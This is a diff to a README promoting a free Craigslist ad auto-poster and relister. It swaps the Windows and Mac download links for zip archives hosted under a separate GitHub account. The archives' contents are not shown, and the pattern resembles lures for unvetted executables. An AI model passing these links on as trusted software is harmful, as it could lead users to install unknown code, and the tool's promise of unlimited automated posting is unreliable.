@@ -1,9 +1,9 @@
 # Craigslist Auto Poster FREE
 ![Craigslist Auto Poster](https://github.com/craigslist-automated/Craigslist-auto-poster-free/blob/main/images/craigslistrelister.png?raw=true)
 ## Download
-[![Craigslist Auto Poster Windows](https://github.com/craigslist-automated/Craigslist-auto-poster-free/blob/main/images/windows.png?raw=true)](https://github.com/appdownloads/software/raw/main/craigslist-reposter-windows.zip)  |  [![Craigslist Auto Poster Mac](https://github.com/craigslist-automated/Craigslist-auto-poster-free/blob/main/images/mac.png?raw=true)](https://github.com/appdownloads/software/raw/main/craigslist-reposter-mac.zip)
+[![Craigslist Auto Poster Windows](https://github.com/craigslist-automated/Craigslist-auto-poster-free/blob/main/images/windows.png?raw=true)](https://github.com/appdownloads/software/raw/main/craigslist-auto-poster-windows.zip)  |  [![Craigslist Auto Poster Mac](https://github.com/craigslist-automated/Craigslist-auto-poster-free/blob/main/images/mac.png?raw=true)](https://github.com/appdownloads/software/raw/main/craigslist-auto-poster-mac.zip)
 :-------------------------:|:-------------------------:
-[Windows](https://github.com/appdownloads/software/raw/main/craigslist-reposter-windows.zip)             |  [Mac](https://github.com/appdownloads/software/raw/main/craigslist-reposter-mac.zip)
+[Windows](https://github.com/appdownloads/software/raw/main/craigslist-auto-poster-windows.zip)             |  [Mac](https://github.com/appdownloads/software/raw/main/craigslist-auto-poster-mac.zip)
 ### Features
 - FREE, unlimited posts, upgrades included, use forever.
 - Idle mode relists when your ad category hasn't been posted in over 15 minutes.
